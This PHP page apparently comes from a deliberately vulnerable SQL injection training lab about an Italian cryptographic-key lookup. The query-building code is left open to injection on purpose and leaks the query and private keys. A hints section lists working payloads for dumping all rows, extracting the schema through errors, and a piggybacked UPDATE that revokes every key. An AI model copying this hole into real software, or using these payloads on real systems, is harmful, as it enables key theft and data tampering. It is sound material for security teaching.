<?php
session_start();
if (!isset($_SESSION['user_data'])) {
    header('Location: login.php');
    exit;
}
require_once 'db_config.php';

$results = [];
$key_id = '';

if (isset($_GET['id'])) {
    $key_id = $_GET['id'];
    
    $query = "SELECT c.*, 
              p.nome, p.cognome, p.matricola,
              a.nome as algoritmo_nome,
              cl.nome as classificazione
              FROM chiavi_crittografiche c
              JOIN personale p ON c.proprietario_id = p.id
              JOIN algoritmo_crittografia a ON c.algoritmo_id = a.id
              JOIN classificazione cl ON c.classificazione_id = cl.id
              WHERE c.id = '$key_id'";
    
    echo "<!-- DEBUG Query: $query -->";
    
    $results = execute_query($query);
}

$db_error = null;
if (!empty($results) && isset($results[0]['__error'])) {
    $db_error = $results[0]['__error'];
    $results = [];
}

?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chiavi Crittografiche</title>
    <link rel="stylesheet" href="/css/common.css">
    <link rel="stylesheet" href="css/keys.css">
</head>
<body>
    <div class="container">
        <h1>CHIAVI CRITTOGRAFICHE</h1>
        
        <form method="GET" class="search-form">
            <input type="text" name="id" 
                   placeholder="Inserisci ID chiave..." 
                   value="<?php echo htmlspecialchars($key_id); ?>">
            <input type="submit" value="RECUPERA CHIAVE">
        </form>
        
        <?php if ($results && count($results) > 0): ?>
            <div class="results-count">
                <strong>Risultati trovati: <?php echo count($results); ?> comunicazioni</strong>
            </div>
            
            <?php foreach ($results as $key): ?>
                <div class="success-box">
                    <div class="card-header">
                        <div class="card-title">
                            <?php echo htmlspecialchars($key['identificativo']); ?>
                        </div>
                            KEY: <?php echo htmlspecialchars($key['id']); ?>
                    </div>
                    
                    <div class="user-info">
                        <div class="info-item">
                            <div class="info-label">Proprietario</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($key['nome'] . ' ' . $key['cognome']); ?><br>
                                <small style="color: #666;">
                                    (<?php echo htmlspecialchars($key['matricola']); ?>)
                                </small>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Algoritmo</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($key['algoritmo_nome']); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Classificazione</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($key['classificazione']); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Generata</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($key['data_generazione']); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Scadenza</div>
                            <div class="info-value">
                                <?php if (!empty($key['data_scadenza'])): ?>
                                    <span class="expiry-badge">
                                        <?php echo htmlspecialchars($key['data_scadenza']); ?>
                                    </span>
                                <?php else: ?>
                                    N/A
                                <?php endif; ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Stato</div>
                            <div class="info-value">
                                <?php echo $key['revocata'] ? 'REVOCATA' : 'ATTIVA'; ?>
                            </div>
                        </div>
                    </div>
                    
                    <div class="message-section">
                        <strong>CHIAVE PUBBLICA:</strong><br>
                        <div class="info-value">
                            <?php echo (htmlspecialchars($key['chiave_pubblica'])); ?>
                        </div>
                    </div>
                    
                    <div class="message-section">
                        <strong>CHIAVE PRIVATA (CLASSIFICATA - CONFIDENTIALITY BREACH):</strong><br>
                        <div class="info-value">
                            <?php echo (htmlspecialchars($key['chiave_privata'])); ?>
                        </div>
                    </div>
                    
                    <?php if (!empty($key['passphrase'])): ?>
                        <div class="message-section">
                            <strong>PASSPHRASE:</strong><br>
                            <span class="info-value">
                                <?php echo htmlspecialchars($key['passphrase']); ?>
                            </span>
                        </div>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
            
        <?php elseif (isset($_GET['id'])): ?>
            <?php if ($db_error): ?>
                <div style="text-align: center; color: #f00; padding: 20px; border: 1px solid #f00; border-radius: 5px; word-wrap: break-word; word-break: break-word; overflow-wrap: break-word; max-width: 100%;">
                    Errore database: "<?php echo htmlspecialchars($db_error); ?>"
                </div>
            <?php endif; ?>
            
            <div style="text-align: center; color: #f00; padding: 20px; border: 1px solid #f00; border-radius: 5px; word-wrap: break-word; word-break: break-word; overflow-wrap: break-word; max-width: 100%;">
                Nessuna comunicazione trovata per: "<?php echo htmlspecialchars($key_id); ?>"
                <br><br>
                <?php echo htmlspecialchars($query); ?>
            </div>
        <?php endif; ?>

        <div class="hints">
            <h3>ISTRUZIONI PER ATTACCO SQL INJECTION</h3>
            
            <strong>1. Mostra la Query:</strong>
            <code>Qualsiasi numero negativo</code>

            <strong>2. Mostra tutte le chiavi (Tautologia):</strong>
            <code>-1' OR '1'='1' --</code>
            
            <strong>3. Lancia Errore per scoprire la struttura tabella (Information Schema):</strong>
            <code>-1' AND 1=CAST((SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='chiavi_crittografiche') AS INT) --</code>
            
            <strong>4. Revoca tutte le chiavi (piggybacked - INTEGRITY BREACH):</strong>
            <code>-1' OR '1'='1'; UPDATE chiavi_crittografiche SET revocata=true WHERE '1'='1' --</code>
        </div>
        
        <div class="bottom-buttons">
            <a href="login.php" class="btn1 left">&lt;- Indietro </a>
        </div>
    </div>
</body>
</html>